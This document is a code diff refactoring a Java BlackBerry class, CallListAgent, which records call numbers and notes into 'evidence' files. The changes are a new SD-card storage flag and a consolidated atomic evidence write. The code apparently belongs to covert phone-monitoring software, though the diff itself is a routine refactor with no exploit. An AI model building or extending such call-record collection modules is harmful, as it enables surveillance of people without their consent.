@@ -12,6 +12,7 @@ import java.util.Date;
 
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.CallListObserver;
@@ -19,14 +20,12 @@ import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class CallListAgent.
  */
 public final class CallListAgent extends Agent implements CallListObserver {
     //#ifdef DEBUG
     private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);
-
     //#endif
 
     /**
@@ -35,8 +34,8 @@ public final class CallListAgent extends Agent implements CallListObserver {
      * @param agentStatus
      *            the agent status
      */
-    public CallListAgent(final boolean agentStatus) {
-        super(Agent.AGENT_CALLLIST, agentStatus, true, "CallListAgent");
+    public CallListAgent(final boolean agentEnabled) {
+        super(Agent.AGENT_CALLLIST, agentEnabled, Conf.AGENT_CALLIST_ON_SD, "CallListAgent");
 
     }
 
@@ -73,7 +72,7 @@ public final class CallListAgent extends Agent implements CallListObserver {
      * @see blackberry.agent.Agent#parse(byte[])
      */
     protected boolean parse(final byte[] confParameters) {
-        // TODO Auto-generated method stub
+
         return false;
     }
 
@@ -129,11 +128,8 @@ public final class CallListAgent extends Agent implements CallListObserver {
         Utils.addTypedString(databuffer, (byte) 0x04, note);
         Utils.addTypedString(databuffer, (byte) 0x08, number);
 
-        evidence.createEvidence(getAdditionalData());
+        evidence.atomicWriteOnce(getAdditionalData(), databuffer.getArray());
 
-        final byte[] array = databuffer.getArray();
-        evidence.writeEvidence(array, 0);
-        evidence.close();
     }
 
     private int wsize(String string) {
